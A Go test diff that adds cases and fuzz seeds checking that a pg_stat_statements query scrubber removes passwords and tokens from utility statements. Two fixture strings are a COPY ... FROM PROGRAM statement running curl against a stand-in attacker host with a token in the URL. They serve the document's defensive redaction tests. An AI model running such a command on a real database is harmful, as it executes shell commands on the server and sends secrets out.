@@ -45,6 +45,29 @@ func TestScrubQueryText_dollarQuotedShowsMarker(t *testing.T) {
 	}
 }
 
+// TestScrubQueryText_utilityStatementSecrets pins the invariant that pgss text is
+// NOT safe verbatim. pg_stat_statements normalizes DML parameters to $N, but
+// stores UTILITY statements as typed — so a CREATE USER … PASSWORD, ALTER ROLE …
+// PASSWORD, ENCRYPTED PASSWORD, COPY … FROM PROGRAM, or DO $$…$$ carries real
+// secrets into the collector. ScrubQueryText must strip them. Named explicitly so
+// a future contributor can't re-introduce the "pgss is already normalized" hole.
+func TestScrubQueryText_utilityStatementSecrets(t *testing.T) {
+	cases := []struct{ name, in, secret string }{
+		{"CREATE USER PASSWORD", "CREATE USER app PASSWORD 'sup3rs3cr3t'", "sup3rs3cr3t"},
+		{"ALTER ROLE PASSWORD", "ALTER ROLE app WITH PASSWORD 'hunter2'", "hunter2"},
+		{"ENCRYPTED PASSWORD", "CREATE ROLE r ENCRYPTED PASSWORD 'md5deadbeefcafe'", "md5deadbeefcafe"},
+		{"COPY FROM PROGRAM", "COPY t FROM PROGRAM 'curl https://evil.example/x?token=abcd1234'", "token=abcd1234"},
+		{"DO block credential", "DO $$ BEGIN PERFORM login('root', 'p@ssw0rd') END $$", "p@ssw0rd"},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			if out := ScrubQueryText(c.in); strings.Contains(out, c.secret) {
+				t.Errorf("secret %q survived: %q -> %q", c.secret, c.in, out)
+			}
+		})
+	}
+}
+
 // FuzzScrubQueryText asserts the invariants that actually matter: for ANY input,
 // no email-, uuid-, or standalone-number-shaped substring survives. (A bare '@'
 // operator or a digit inside an identifier like col1 is not PII and may remain,
@@ -60,6 +83,11 @@ func FuzzScrubQueryText(f *testing.F) {
 		"SELECT col1, t2.c3 FROM t2", // digits inside identifiers — not literals
 		"SELECT 'O''Brien'",
 		"", "$$", "'unterminated", "a@b.co1", "1@1.11",
+		// Utility statements pgss stores VERBATIM — the class this fuzzer guards.
+		"CREATE USER app PASSWORD 'sup3rs3cr3t'",
+		"ALTER ROLE app WITH ENCRYPTED PASSWORD 'md5abc'",
+		"COPY t FROM PROGRAM 'curl https://evil.example/?token=abcd'",
+		"DO $$ BEGIN PERFORM login('root','p@ss') END $$",
 	} {
 		f.Add(s)
 	}
